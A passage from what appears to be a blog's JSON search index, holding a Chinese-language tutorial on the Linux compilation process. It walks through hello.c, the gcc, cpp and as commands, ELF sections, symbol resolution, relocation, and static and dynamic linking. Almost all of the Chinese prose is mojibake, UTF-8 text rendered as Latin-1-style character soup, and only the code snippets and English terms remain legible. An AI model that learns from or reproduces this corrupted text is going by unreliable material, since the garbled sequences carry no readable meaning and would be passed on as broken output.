%E6%8A%A4%E6%9C%BA%E5%88%B6/"}]},{"title":"Linuxä»£ç ç¼–è¯‘è¿‡ç¨‹","slug":"Linuxç¯å¢ƒä¸‹ç¼–è¯‘è¿‡ç¨‹","date":"2021-04-11T16:05:33.539Z","updated":"2021-04-11T16:05:11.515Z","comments":true,"path":"2021/04/12/Linuxç¯å¢ƒä¸‹ç¼–è¯‘è¿‡ç¨‹/","link":"","permalink":"http://example.com/2021/04/12/Linux%E7%8E%AF%E5%A2%83%E4%B8%8B%E7%BC%96%E8%AF%91%E8%BF%87%E7%A8%8B/","excerpt":"","text":"Linuxä¸‹Hello Worldçš„å‰ç”Ÿä»Šä¸–ä»£ç å¼•å…¥hello.c 1234567#include &lt;stdio.h&gt;int main(int argc,char *argv[],char *envp[])&#123; printf(&quot;Hello World\\n&quot;); return 0;&#125; linuxç¯å¢ƒä¸‹æˆ‘ä»¬å¯ä»¥é€šè¿‡GCCç¼–è¯‘hello.c: 1$ gcc -g hello.c -o hello å½“å‰ç›®å½•å…ˆä¼šç”Ÿæˆhelloå¯æ‰§è¡Œæ–‡ä»¶ã€‚ mainå‡½æ•°çš„ä¸‰ä¸ªå‚æ•°int argc intå‹å˜é‡ï¼Œè¡¨ç¤ºä¼ é€’ç»™mainå‡½æ•°çš„å‚æ•°æ•°é‡ã€‚ char *argv æŒ‡é’ˆæ•°ç»„ï¼Œæ¯ä¸ªæŒ‡é’ˆæŒ‡å‘å„ä¸ªå…·ä½“çš„å‚æ•°ã€‚ char*envp ç¯å¢ƒå˜é‡ï¼Œå¯ä»¥ä¸ºç¨‹åºè¿è¡Œè¿‡ç¨‹ä¸­éœ€è¦ä½¿ç”¨ç¯å¢ƒå˜é‡åšå‚è€ƒã€‚ Demo: 1$ ./hello //æ‰§è¡Œè¯¥æ–‡ä»¶ æ­¤æ—¶argc=1,è¡¨ç¤ºåªæœ‰ä¸€ä¸ªå‚æ•°è¾“å…¥ argvåªæœ‰ä¸€ä¸ªå…ƒç´ ,argv[0]æŒ‡å‘è¾“å…¥ç¨‹åºè·¯å¾„åŠåç§°: ./hello 1$ ./hello para_1 æ­¤æ—¶argc=2,æœ‰ä¸¤ä¸ªå‚æ•°ä¼ å…¥ argc[0]æŒ‡å‘è¾“å…¥ç¨‹åºè·¯å¾„åŠåç§° â€œ./helloâ€ argv[1]æŒ‡å‘para_1å­—ç¬¦ä¸² whatâ€™s gccGCCæ˜¯GNU Compiler Collectionçš„ç¼©å†™ï¼ŒGCCæ˜¯ä¸€ç³»åˆ—ç¼–è¯‘å™¨çš„é›†åˆï¼Œæ˜¯Linuxæ“ä½œç³»ç»Ÿçš„æ ¸å¿ƒç»„ä»¶ä¹‹ä¸€ã€‚GCCæœ€åˆåä¸ºGNU C Compilerï¼Œå½“æ—¶å®ƒåªæ˜¯ä¸€æ¬¾Cè¯­è¨€çš„ç¼–è¯‘å™¨ï¼Œä¸è¿‡éšç€åç»­è¿­ä»£ï¼Œå®ƒæ”¯æŒC++ã€Fortranã€Goç­‰è¯­è¨€ï¼ŒGCCä¹Ÿå› æ­¤æˆä¸ºä¸€ä¸ªç¼–è¯‘å™¨é›†åˆã€‚GCCæœ‰ä»¥ä¸‹ç‰¹ç‚¹ï¼š GCCæ”¯æŒçš„ç¼–ç¨‹è¯­è¨€å¤šã€‚æ¯”å¦‚ï¼Œg++æ˜¯C++ç¼–è¯‘å™¨ï¼Œgfortranæ˜¯Fortranç¼–è¯‘å™¨ã€‚ GCCæ”¯æŒçš„ç¡¬ä»¶å…¨ã€‚GCCå¯ä»¥å°†æºä»£ç ç¼–è¯‘æˆx86_64ã€ARMã€PowerPCç­‰ç¡¬ä»¶æ¶æ„å¹³å°çš„å¯æ‰§è¡Œæ–‡ä»¶ã€‚ GCCæ”¯æŒä¼—å¤šä¸šç•Œæ ‡å‡†ã€‚GCCèƒ½å¾ˆå¿«æ”¯æŒæœ€æ–°çš„C++æ ‡å‡†ï¼ŒGCCæ”¯æŒOpenMPã€OpenACCã€‚ ç¼–è¯‘è¿‡ç¨‹åˆ†æ é¢„å¤„ç†é¢„å¤„ç†å™¨CPPå·¥å…·è¿›è¡Œé¢„å¤„ç† 1$ cpp hello.c -o hello.i é¢„ç¼–è¯‘ä¸»è¦å¤„ç†æºä»£ç ä¸­ä»¥#å¼€å§‹çš„é¢„ç¼–è¯‘æŒ‡ä»¤ï¼Œä¸»è¦å¤„ç†è§„åˆ™å¦‚ä¸‹ï¼š å¤„ç†#include é¢„ç¼–è¯‘æŒ‡ä»¤ï¼Œå°†è¢«åŒ…å«çš„æ–‡ä»¶æ’å…¥åˆ°è¯¥é¢„ç¼–è¯‘æŒ‡ä»¤çš„ä½ç½®ã€‚è¿™æ˜¯ä¸€ä¸ªé€’å½’çš„è¿‡ç¨‹ï¼Œå¦‚æœè¢«åŒ…å«çš„æ–‡ä»¶è¿˜åŒ…å«äº†å…¶ä»–æ–‡ä»¶ï¼Œä¼šé€’å½’åœ°å®Œæˆè¿™ä¸ªè¿‡ç¨‹ã€‚ å¤„ç†æ¡ä»¶é¢„ç¼–è¯‘æŒ‡ä»¤ï¼Œæ¯”å¦‚#ifã€#ifdefã€#elifã€#elseã€#endifã€‚ åˆ é™¤#defineï¼Œå±•å¼€æ‰€æœ‰å®å®šä¹‰ã€‚ æ·»åŠ è¡Œå·å’Œæ–‡ä»¶åæ ‡è¯†ï¼Œä»¥ä¾¿äºåœ¨ç¼–è¯‘è¿‡ç¨‹ä¸­äº§ç”Ÿç¼–è¯‘é”™è¯¯æˆ–è€…è°ƒè¯•æ—¶éƒ½èƒ½å¤Ÿç”Ÿæˆè¡Œå·ä¿¡æ¯ã€‚ ç¼–è¯‘gccå¯¹é¢„å¤„ç†åçš„hello.iæ–‡ä»¶æƒŠé†’ç¼–è¯‘ã€‚ç¼–è¯‘çš„è¿‡ç¨‹ä¸»è¦æ˜¯è¿›è¡Œè¯æ³•åˆ†æã€è¯­æ³•åˆ†æã€è¯­ä¹‰åˆ†æï¼Œè¿™èƒŒåæ¶‰åŠç¼–è¯‘åŸç†ç­‰ä¸€äº›å†…å®¹ã€‚è¿™é‡Œåªè¿›è¡Œç¼–è¯‘ï¼Œä¸æ±‡ç¼–ï¼Œå¯ä»¥ç”Ÿæˆç¡¬ä»¶å¹³å°ç›¸å…³çš„æ±‡ç¼–è¯­è¨€ã€‚ 1$ gcc -S hello.i -o hello.s å®ƒåŒ…å«ä¸€ä¸ªæ±‡ç¼–è¯­è¨€ç¨‹åºï¼Œå³å°†Cè¯­è¨€ç¨‹åºç¼–è¯‘æˆæ±‡ç¼–è¯­è¨€ç¨‹åºã€‚ æ±‡ç¼–1$ as hello.s -o hello.o aså·¥å…·å°†hello.sæ–‡ä»¶ç¿»è¯‘ä¸ºäºŒè¿›åˆ¶ä»£ç ã€‚ è™½ç„¶è¿™ä¸ªæ–‡ä»¶å·²ç»æ˜¯äºŒè¿›åˆ¶çš„æœºå™¨ç äº†ï¼Œä½†æ˜¯å®ƒä»ç„¶ä¸èƒ½æ‰§è¡Œï¼Œå› ä¸ºå®ƒç¼ºå°‘ç³»ç»Ÿè¿è¡Œæ‰€å¿…é¡»çš„åº“ï¼Œæ¯”å¦‚Cè¯­è¨€printf()å¯¹åº”çš„æ±‡ç¼–è¯­è¨€çš„putså‡½æ•°ã€‚ç¡®åˆ‡çš„è¯´ï¼Œç³»ç»Ÿè¿˜ä¸çŸ¥é“putså‡½æ•°åœ¨å†…å­˜ä¸­çš„å…·ä½“ä½ç½®ã€‚å¦‚æœæˆ‘ä»¬åœ¨ä¸€ä»½æºä»£ç ä¸­ä½¿ç”¨äº†å¤–éƒ¨çš„å‡½æ•°æˆ–è€…å˜é‡ï¼Œè¿˜éœ€è¦é‡è¦çš„ä¸€æ­¥ï¼šé“¾æ¥ã€‚ é“¾æ¥1$ gcc hello.o -o hello è¯¥å‘½ä»¤æ˜¯åŸºäºåŠ¨æ€é“¾æ¥çš„æ–¹å¼ï¼Œç”Ÿæˆçš„helloå·²ç»æ˜¯ä¸€ä¸ªå¯æ‰§è¡Œæ–‡ä»¶ã€‚å®é™…ä¸Šï¼Œè¿™ä¸ªå‘½ä»¤éšè—äº†å¾ˆå¤šèƒŒåçš„å†…å®¹ã€‚ main()æ–¹æ³•æ˜¯Cè¯­è¨€ç¨‹åºçš„å…¥å£ï¼Œcrt1.oè¿™å‡ ä¸ªåº“æ˜¯åœ¨å¤„ç†main()æ–¹æ³•è°ƒç”¨ä¹‹å‰å’Œç¨‹åºé€€å‡ºä¹‹åçš„äº‹æƒ…ï¼Œè¿™éœ€è¦ä¸æ“ä½œç³»ç»Ÿåä½œã€‚åœ¨Linuxä¸­ï¼Œä¸€ä¸ªæ–°çš„ç¨‹åºéƒ½æ˜¯ç”±çˆ¶è¿›ç¨‹è°ƒç”¨fork()ï¼Œç”Ÿæˆä¸€ä¸ªå­è¿›ç¨‹ï¼Œç„¶åå†è°ƒç”¨execve()ï¼Œå°†å¯æ‰§è¡Œæ–‡ä»¶åŠ è½½è¿›æ¥ï¼Œæ‰èƒ½è¢«æ“ä½œç³»ç»Ÿæ‰§è¡Œã€‚æ‰€ä»¥ï¼Œå‡†ç¡®åœ°è¯´ï¼Œmain()æ–¹æ³•æ˜¯è¿™ä¸ªç¨‹åºçš„å…¥å£ï¼Œä½†ä»…ä»…ä»main()æ–¹æ³•å¼€å§‹ï¼Œå¹¶ä¸èƒ½é¡ºåˆ©æ‰§è¡Œè¿™ä¸ªç¨‹åºã€‚ é“¾æ¥å™¨å°†å¤šä¸ªç›®æ ‡æ–‡ä»¶åˆå¹¶æˆä¸€ä¸ªå¯æ‰§è¡Œç›®æ ‡æ–‡ä»¶ï¼Œè¿™ä¸ªäºŒè¿›åˆ¶æ–‡ä»¶åŒ…å«åŠ è½½ç¨‹åºåˆ°å†…å­˜å¹¶è¿è¡Œçš„æ‰€æœ‰ä¿¡æ¯ã€‚ é“¾æ¥è¿‡ç¨‹ä¸»è¦åŒ…å«äº†ä¸¤ä¸ªæ­¥éª¤ï¼š åœ°å€ä¸ç©ºé—´åˆ†é…ï¼ˆAddress and Storage Allocationï¼‰ è¿™ä¸ªè¿‡ç¨‹ä¸­ï¼Œ æ‰«ææ‰€æœ‰çš„è¾“å…¥ç›®æ ‡æ–‡ä»¶ï¼Œè·å¾—å®ƒä»¬çš„å„ä¸ªèŠ‚çš„é•¿åº¦ã€å±æ€§ã€ä½ç½®ï¼Œå¹¶å°†è¾“å…¥ç›®æ ‡æ–‡ä»¶ä¸­çš„ç¬¦å·è¡¨ä¸­æ‰€æœ‰çš„ç¬¦å·å®šä¹‰å’Œç¬¦å·å¼•ç”¨æ”¶é›†èµ·æ¥ï¼Œç»Ÿä¸€æ”¾åˆ°ä¸€ä¸ªå…¨å±€çš„ç¬¦å·è¡¨ã€‚è¿™ä¸€æ­¥ï¼Œé“¾æ¥å™¨èƒ½å¤Ÿè·å¾—æ‰€æœ‰è¾“å…¥ç›®æ ‡æ–‡ä»¶çš„èŠ‚çš„é•¿åº¦ï¼Œå¹¶å°†å®ƒä»¬åˆå¹¶ï¼Œè®¡ç®—å‡ºè¾“å‡ºæ–‡ä»¶ä¸­å„ä¸ªèŠ‚åˆå¹¶åçš„é•¿åº¦ä¸ä½ç½®ï¼Œå¹¶å»ºç«‹æ˜ å°„å…³ç³»ã€‚ è¿™é‡Œå¼•å…¥å¯æ‰§è¡Œç›®æ ‡æ–‡ä»¶çš„æ¦‚å¿µã€‚ .text:å·²ç¼–è¯‘ç¨‹åºçš„æœºå™¨ä»£ç  .rodata:åªè¯»æ•°æ® .data:å·²åˆå§‹åŒ–çš„å…¨å±€å’Œé™æ€Cå˜é‡ .bss:æœªåˆå§‹åŒ–çš„å…¨å±€å’Œé™æ€Cå˜é‡ .symtab: ç¬¦å·è¡¨ï¼Œå­˜æ”¾åœ¨ç¨‹åºä¸­å®šä¹‰å’Œå¼•ç”¨çš„å‡½æ•°å’Œå…¨å±€å˜é‡çš„ä¿¡æ¯ .debug:è°ƒè¯•ç¬¦å·è¡¨ å¯æ‰§è¡Œæ–‡ä»¶ä¸­çš„æ®µæ˜¯ç”±ç›®æ ‡æ–‡ä»¶ä¸­çš„èŠ‚åˆå¹¶è€Œæ¥çš„ï¼Œä»¥ä¸‹æ˜¯é“¾æ¥å™¨å¦‚ä½•å°†å®ƒä»¬çš„å„ä¸ªèŠ‚åˆå¹¶åˆ°è¾“å‡ºæ–‡ä»¶ï¼Œä¹Ÿå³è¾“å‡ºæ–‡ä»¶ä¸­çš„ç©ºé—´å¦‚ä½•åˆ†é…ç»™è¾“å…¥æ–‡ä»¶çš„ä¸¤ç§æ–¹å¼ã€‚ é¡ºåºå åŠ  è™½ç„¶è¿™ç§æ–¹æ³•éå¸¸ç®€å•ï¼Œä½†æ˜¯å®ƒå­˜åœ¨ä¸€ä¸ªé—®é¢˜ï¼šåœ¨æœ‰å¾ˆå¤šè¾“å…¥æ–‡ä»¶çš„æƒ…å†µä¸‹ï¼Œè¾“å‡ºæ–‡ä»¶ä¼šæœ‰å¾ˆå¤šé›¶æ•£çš„èŠ‚ã€‚è¿™ç§åšæ³•éå¸¸æµªè´¹ç©ºé—´ï¼Œå› ä¸ºæ¯ä¸ªèŠ‚éƒ½éœ€è¦æœ‰ä¸€å®šçš„åœ°å€å’Œç©ºé—´å¯¹é½è¦æ±‚ã€‚x86ç¡¬ä»¶çš„å¯¹é½è¦æ±‚æ˜¯4KBã€‚å¦‚æœä¸€ä¸ªèŠ‚çš„å¤§å°åªæœ‰1ä¸ªå­—èŠ‚ï¼Œå®ƒä¹Ÿè¦åœ¨å†…å­˜åœ¨é‡ç”¨4KBã€‚è¿™æ ·ä¼šé€ æˆå¤§é‡å†…éƒ¨ç¢ç‰‡ã€‚æ‰€ä»¥ä¸æ˜¯ä¸€ä¸ªå¥½çš„æ–¹æ¡ˆã€‚ åˆå¹¶ç›¸ä¼¼èŠ‚ ä¸€ä¸ªæ›´åŠ å®é™…çš„æ–¹æ³•ä¾¿æ˜¯åˆå¹¶ç›¸åŒæ€§è´¨çš„èŠ‚ï¼Œæ¯”å¦‚ï¼šå°†æ‰€æœ‰è¾“å…¥æ–‡ä»¶çš„ .textèŠ‚åˆå¹¶åˆ°è¾“å‡ºæ–‡ä»¶çš„ textæ®µï¼ˆæ³¨æ„ï¼Œæ­¤æ—¶å‡ºç°äº†æ®µå’ŒèŠ‚ä¸¤ä¸ªæ¦‚å¿µï¼‰ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºã€‚ å…¶ä¸­.bssèŠ‚åœ¨ç›®æ ‡æ–‡ä»¶å’Œå¯æ‰§è¡Œæ–‡ä»¶ä¸­ä¸å ç”¨æ–‡ä»¶çš„ç©ºé—´ï¼Œä½†æ˜¯å®ƒåœ¨è£…è½½æ—¶å ç”¨åœ°å€ç©ºé—´ã€‚äº‹å®ä¸Šï¼Œè¿™é‡Œçš„ç©ºé—´å’Œåœ°å€æœ‰ä¸¤å±‚å«ä¹‰: åœ¨è¾“å‡ºçš„å¯æ‰§è¡Œæ–‡ä»¶ä¸­çš„ç©ºé—´ åœ¨è£…è½½åçš„è™šæ‹Ÿåœ°å€ä¸­çš„ç©ºé—´ å¯¹äºæœ‰å®é™…æ•°æ®çš„èŠ‚ï¼Œå¦‚.textå’Œ.dataï¼Œå®ƒä»¬åœ¨æ–‡ä»¶ä¸­å’Œè™šæ‹Ÿåœ°å€ä¸­éƒ½è¦åˆ†é…ç©ºé—´ï¼Œå› ä¸ºå®ƒä»¬åœ¨è¿™ä¸¤è€…ä¸­éƒ½å­˜åœ¨ï¼›å¯¹äº.bssæ¥ï¼Œåˆ†é…ç©ºé—´çš„æ„ä¹‰åªå±€é™äºè™šæ‹Ÿåœ°å€ç©ºé—´ï¼Œå› ä¸ºå®ƒåœ¨æ–‡ä»¶ä¸­å¹¶æ²¡æœ‰å†…å®¹ã€‚æˆ‘ä»¬åœ¨è¿™é‡Œè°ˆåˆ°çš„ç©ºé—´åˆ†é…åªå…³æ³¨äºè™šæ‹Ÿåœ°å€ç©ºé—´ï¼ˆè§ä¸‹å›¾ï¼‰çš„åˆ†é…ï¼Œå› ä¸ºè¿™å…³ç³»åˆ°é“¾æ¥å™¨åé¢çš„å…³äºåœ°å€è®¡ç®—çš„æ­¥éª¤ï¼Œè€Œå¯æ‰§è¡Œæ–‡ä»¶æœ¬èº«çš„ç©ºé—´åˆ†é…ä¸é“¾æ¥çš„å…³ç³»å¹¶ä¸å¤§ã€‚ ç°åœ¨çš„é“¾æ¥å™¨ç©ºé—´åˆ†é…çš„ç­–ç•¥åŸºæœ¬ä¸Šéƒ½é‡‡ç”¨â€œåˆå¹¶ç›¸ä¼¼èŠ‚â€çš„æ–¹æ³•ï¼Œä½¿ç”¨è¿™ç§æ–¹æ³•çš„é“¾æ¥å™¨ä¸€èˆ¬é‡‡ç”¨ä¸€ç§å« ä¸¤æ­¥é“¾æ¥ï¼ˆTwo-pass Linkingï¼‰ çš„æ–¹æ³•ã€‚å³æ•´ä¸ªé“¾æ¥è¿‡ç¨‹åˆ†ä¸ºåœ°å€ä¸ç©ºé—´åˆ†é…å’Œç¬¦å·è§£æã€é‡å®šä½ã€‚ ç¬¦å·è§£æï¼ˆSymbol Resolutionï¼‰å’Œé‡å®šä½ï¼ˆRelocationï¼‰ ä½¿ç”¨å‰ä¸€æ­¥ä¸­æ”¶é›†åˆ°çš„æ‰€æœ‰ä¿¡æ¯ï¼Œè¯»å–è¾“å…¥æ–‡ä»¶ä¸­èŠ‚çš„è¾“æ•°æ®ã€é‡å®šä½ä¿¡æ¯ï¼Œå¹¶ä¸”è¿›è¡Œç¬¦å·è§£æä¸é‡å®šä½ã€è°ƒæ•´ä»£ç ã€è°ƒæ•´ä»£ç ä¸­çš„åœ°å€ç­‰ã€‚é‡å®šä½æ˜¯é“¾æ¥è¿‡ç¨‹çš„æ ¸å¿ƒã€‚åœ¨åœ°å€ä¸ç©ºé—´åˆ†é…æ­¥éª¤å®Œæˆä¹‹åï¼Œç›¸ä¼¼æƒé™çš„èŠ‚ä¼šè¢«åˆå¹¶æˆæ®µï¼Œå¹¶ç”Ÿæˆäº† ç¨‹åºå¤´è¡¨ï¼ˆProgram Header Tableï¼‰ ç»“æ„ã€‚å¦‚ä¸‹å›¾å¯æ‰§è¡Œæ–‡ä»¶ç»“æ„æ‰€ç¤ºï¼Œä¸»è¦ç”Ÿæˆä¸¤ä¸ªæ®µï¼šä»£ç æ®µï¼ˆ textæ®µï¼‰ã€æ•°æ®æ®µï¼ˆ dataæ®µ ï¼‰ã€‚ ç¬¦å·è§£æ é‡å®šä½çš„è¿‡ç¨‹æ˜¯ä¼´éšç€ç¬¦å·è§£æçš„ï¼Œè¿™é‡Œå…ˆä»‹ç»ç¬¦å·è§£æã€‚ é“¾æ¥å™¨è§£æç¬¦å·å¼•ç”¨çš„æ–¹æ³•æ˜¯å°†æ¯ä¸ªå¼•ç”¨ä¸å®ƒè¾“å…¥çš„å¯é‡å®šä½ç›®æ ‡æ–‡ä»¶çš„ç¬¦å·è¡¨ä¸­çš„ä¸€ä¸ªç¡®å®šçš„ç¬¦å·å®šä¹‰å…³è”èµ·æ¥ã€‚å¯¹é‚£äº›å’Œå¼•ç”¨å®šä¹‰åœ¨ç›¸åŒæ¨¡å—çš„å±€éƒ¨ç¬¦å·çš„å¼•ç”¨ï¼Œç¬¦å·è§£ææ˜¯éå¸¸ç®€å•çš„ã€‚ç¼–è¯‘å™¨åªå…è®¸æ¯ä¸ªæ¨¡å—ä¸­æ¯ä¸ªå±€éƒ¨ç¬¦å·æœ‰ä¸€ä¸ªå®šä¹‰ã€‚é™æ€å±€éƒ¨å˜é‡ä¹Ÿä¼šæœ‰æœ¬åœ°é“¾æ¥å™¨ç¬¦å·ï¼Œç¼–è¯‘å™¨è¿˜è¦ç¡®ä¿å®ƒä»¬æ‹¥æœ‰å”¯ä¸€çš„åå­—ã€‚ ç„¶è€Œï¼Œå¯¹äºå…¨å±€ç¬¦å·çš„è§£æè¦å¤æ‚å¾—å¤šã€‚å½“ç¼–è¯‘å™¨é‡åˆ°ä¸€ä¸ªä¸æ˜¯åœ¨å½“å‰æ¨¡å—ä¸­å®šä¹‰çš„ç¬¦å·ï¼ˆå˜é‡æˆ–å‡½æ•°åï¼‰æ—¶ï¼Œä¼šå‡è®¾è¯¥ç¬¦å·æ˜¯åœ¨å…¶ä»–æŸä¸ªæ¨¡å—ä¸­å®šä¹‰çš„ï¼Œç”Ÿæˆä¸€ä¸ªé“¾æ¥å™¨ç¬¦å·è¡¨æ¡ç›®ï¼Œå¹¶æŠŠå®ƒäº¤ç»™é“¾æ¥å™¨å¤„ç†ã€‚å¦‚æœé“¾æ¥å™¨åœ¨å®ƒçš„ä»»ä½•è¾“å…¥æ¨¡å—ä¸­éƒ½æ‰¾ä¸åˆ°è¿™ä¸ªè¢«å¼•ç”¨ç¬¦å·çš„å®šä¹‰ï¼Œå°±è¾“å‡ºä¸€æ¡é”™è¯¯ä¿¡æ¯å¹¶ç»ˆæ­¢ã€‚ å¤šé‡å®šä¹‰çš„å…¨å±€ç¬¦å·è§£æåœ¨æ­¤ä¸åšä»‹ç»ã€‚ é‡å®šä½ é“¾æ¥çš„å‰ä¸¤æ­¥å®Œæˆä¹‹åï¼Œé“¾æ¥å™¨å°±å·²ç»ç¡®å®šæ‰€æœ‰ç¬¦å·çš„è™šæ‹Ÿåœ°å€äº†ï¼Œé‚£ä¹ˆé“¾æ¥å™¨å°±å¯ä»¥æ ¹æ®ç¬¦å·çš„åœ°å€å¯¹æ¯ä¸ªéœ€è¦é‡å®šä½çš„æŒ‡ä»¤è¿›è¡Œåœ°å€ä¿®æ­£ã€‚ é‚£ä¹ˆé“¾æ¥å™¨å¦‚ä½•çŸ¥é“å“ªäº›æŒ‡ä»¤æ˜¯è¦è¢«è°ƒæ•´çš„å‘¢ï¼Ÿäº‹å®ä¸Šï¼Œæˆ‘ä»¬å‰é¢æåˆ°çš„ELFæ–‡ä»¶ä¸­çš„ é‡å®šä½è¡¨ï¼ˆRelocation Tableï¼‰ ä¸“é—¨ç”¨æ¥ä¿å­˜è¿™äº›ä¸é‡å®šä½ç›¸å…³çš„ä¿¡æ¯ã€‚ å¯¹äºå¯é‡å®šä½çš„ELFæ–‡ä»¶æ¥è¯´ï¼Œå®ƒå¿…é¡»åŒ…å«é‡å®šä½è¡¨ï¼Œç”¨æ¥æè¿°å¦‚ä½•ä¿®æ”¹ç›¸åº”çš„èŠ‚çš„å†…å®¹ã€‚å¯¹äºæ¯ä¸ªè¦è¢«é‡å®šä½çš„ELFèŠ‚éƒ½æœ‰ä¸€ä¸ªå¯¹åº”çš„é‡å®šä½è¡¨ã€‚å¦‚æœ.textèŠ‚éœ€è¦è¢«é‡å®šä½ï¼Œåˆ™ä¼šæœ‰ä¸€ä¸ªç›¸å¯¹åº”å«.rel.textçš„èŠ‚ä¿å­˜äº†ä»£ç èŠ‚çš„é‡å®šä½è¡¨ï¼›å¦‚æœ.dataèŠ‚éœ€è¦è¢«é‡å®šä½ï¼Œåˆ™ä¼šæœ‰ä¸€ä¸ªç›¸å¯¹åº”çš„.rel.tdataçš„èŠ‚ä¿å­˜äº†æ•°æ®èŠ‚çš„é‡å®šä½è¡¨ã€‚ é“¾æ¥å¯åˆ†ä¸ºé™æ€é“¾æ¥å’ŒåŠ¨æ€é“¾æ¥ é™æ€é“¾æ¥ç®€å•æ¥è¯´ï¼Œé™æ€é“¾æ¥å°±æ˜¯åœ¨ç¨‹åºåŠ è½½å‰ï¼Œå°†æ‰€ä¾èµ–çš„ç¬¬ä¸‰æ–¹åº“å‡½æ•°éƒ½æ‰“åŒ…åˆ°äº†ä¸€èµ·ï¼Œå½¢æˆä¸€ä¸ªéå¸¸å¤§çš„å¯æ‰§è¡Œæ–‡ä»¶ã€‚å¦‚ä¸‹å›¾æ‰€ç¤ºä¸ºæœ€åŸºæœ¬çš„é™æ€é“¾æ¥è¿‡ç¨‹ç¤ºæ„å›¾ã€‚æ¯ä¸ªæ¨¡å—çš„æºä»£ç æ–‡ä»¶ï¼ˆå¦‚.cï¼‰æ–‡ä»¶ç»è¿‡ç¼–è¯‘å™¨ç¼–è¯‘æˆç›®æ ‡æ–‡ä»¶ï¼ˆObject Fileï¼Œä¸€èˆ¬æ‰©å±•åä¸º.oæˆ–.objï¼‰ã€‚ç›®æ ‡æ–‡ä»¶å’Œ åº“ï¼ˆLibraryï¼‰ ä¸€èµ·é“¾æ¥å½¢æˆæœ€ç»ˆçš„å¯æ‰§è¡Œæ–‡ä»¶ã€‚å…¶ä¸­ï¼Œæœ€å¸¸è§çš„åº“å°±æ˜¯è¿è¡Œæ—¶åº“ï¼ˆRuntime Libraryï¼‰ï¼Œå®ƒæ˜¯æ”¯æŒç¨‹åºè¿è¡Œçš„åŸºæœ¬å‡½æ•°çš„é›†åˆã€‚åº“æœ¬è´¨ä¸Šæ˜¯ä¸€ç»„ç›®æ ‡æ–‡ä»¶çš„åŒ…ï¼Œç”±ä¸€äº›æœ€å¸¸ç”¨çš„ä»£ç ç¼–è¯‘æˆç›®æ ‡æ–‡ä»¶åæ‰“åŒ…è€Œæˆã€‚ åŠ¨æ€é“¾æ¥åŠ¨æ€é“¾æ¥æ˜¯åœ¨è¿è¡Œæ—¶ï¼Œå‘ç°ç”¨åˆ°æŸäº›åº“ä¸­çš„æŸäº›å‡½æ•°æ—¶ï¼Œå†ä»è¿™äº›ç¬¬ä¸‰æ–¹åº“ä¸­è¯»å–è‡ªå·±æ‰€éœ€çš„æ–¹æ³•ã€‚ åŠ¨æ€é“¾æ¥çš„åŸºæœ¬å®ç° åŠ¨æ€é“¾æ¥æ¶‰åŠè¿è¡Œæ—¶çš„é“¾æ¥ä»¥åŠå¤šä¸ªæ–‡ä»¶çš„è£…è½½ï¼Œå¿…éœ€è¦æœ‰æ“ä½œç³»ç»Ÿçš„æ”¯æŒã€‚å› ä¸ºåŠ¨æ€é“¾æ¥çš„æƒ…å†µä¸‹ï¼Œè¿›ç¨‹çš„è™šæ‹Ÿåœ°å€ç©ºé—´çš„åˆ†å¸ƒä¼šæ¯”é™æ€é“¾æ¥æƒ…å†µä¸‹æ›´ä¸ºå¤æ‚ï¼Œè¿˜æœ‰ä¸€äº›å­˜å‚¨ç®¡ç†ã€å†…å­˜å…±äº«ã€è¿›ç¨‹çº¿ç¨‹ç­‰æœºåˆ¶åœ¨åŠ¨æ€é“¾æ¥ä¸‹ä¹Ÿä¼šæœ‰ä¸€äº›å¾®å¦™çš„å˜åŒ–ã€‚ ç›®å‰ï¼Œä¸»æµæ“ä½œç³»ç»Ÿéƒ½æ”¯æŒåŠ¨æ€é“¾æ¥ã€‚åœ¨Linuxä¸­ï¼ŒELFåŠ¨æ€é“¾æ¥æ–‡ä»¶è¢«ç§°ä¸º åŠ¨æ€å…±äº«å¯¹è±¡ï¼ˆDSOï¼ŒDynamic Shared Objectsï¼‰ï¼Œä¸€èˆ¬ä»¥.soä¸ºåç¼€ï¼›åœ¨Windowsä¸­ï¼ŒåŠ¨æ€é“¾æ¥æ–‡ä»¶è¢«ç§°ä¸º åŠ¨æ€é“¾æ¥åº“ï¼ˆDynamic Linking Libraryï¼‰ï¼Œä¸€èˆ¬ä»¥.dllä¸ºåç¼€ã€‚ åœ¨Linuxä¸­ï¼Œå¸¸ç”¨çš„Cè¯­è¨€åº“çš„è¿è¡Œåº“glibcï¼Œå…¶åŠ¨æ€é“¾æ¥å½¢å¼çš„ç‰ˆæœ¬ä¿ç•™åœ¨ /libç›®å½•ä¸‹ï¼Œæ–‡ä»¶åä¸º libc.soã€‚æ•´ä¸ªç³»ç»Ÿåªä¿ç•™ä¸€ä»½Cè¯­è¨€åŠ¨æ€é“¾æ¥æ–‡ä»¶libc.soï¼Œæ‰€æœ‰çš„Cè¯­è¨€ç¼–å†™çš„ã€åŠ¨æ€é“¾æ¥çš„ç¨‹åºéƒ½å¯ä»¥åœ¨è¿è¡Œæ—¶ä½¿ç”¨å®ƒã€‚å½“ç¨‹åºè¢«è£…è½½æ—¶ï¼Œç³»ç»Ÿçš„åŠ¨æ€é“¾æ¥å™¨ä¼šå°†ç¨‹åºæ‰€éœ€è¦çš„æ‰€æœ‰åŠ¨æ€é“¾æ¥åº“è£…è½½åˆ°è¿›ç¨‹çš„åœ°å€ç©ºé—´ï¼Œå¹¶å°†ç¨‹åºä¸­æ‰€æœ‰æœªè§£æçš„ç¬¦å·ç»‘å®šåˆ°ç›¸åº”çš„åŠ¨æ€é“¾æ¥åº“ä¸­ï¼Œå¹¶è¿›è¡Œé‡å®šä½ã€‚ åŠ¨æ€é“¾æ¥ç¨‹åºè¿è¡Œæ—¶åœ°å€ç©ºé—´åˆ†å¸ƒ å¯¹äºé™æ€é“¾æ¥çš„å¯æ‰§è¡Œæ–‡ä»¶æ¥è¯´ï¼Œæ•´ä¸ªè¿›ç¨‹åªæœ‰ä¸€ä¸ªæ–‡ä»¶è¦è¢«æ˜ å°„ï¼Œå³å¯æ‰§è¡Œæ–‡ä»¶ã€‚è€Œå¯¹äºåŠ¨æ€é“¾æ¥ï¼Œé™¤äº†å¯æ‰§è¡Œæ–‡ä»¶ï¼Œè¿˜æœ‰å®ƒæ‰€ä¾èµ–çš„å…±äº«ç›®æ ‡æ–‡ä»¶ã€‚ å…³äºå…±äº«ç›®æ ‡æ–‡ä»¶åœ¨å†…å­˜ä¸­çš„åœ°å€åˆ†é…ï¼Œä¸»è¦æœ‰ä¸¤ç§è§£å†³æ–¹æ¡ˆï¼Œåˆ†åˆ«æ˜¯ï¼š é™æ€å…±äº«åº“ï¼ˆStatic Shared 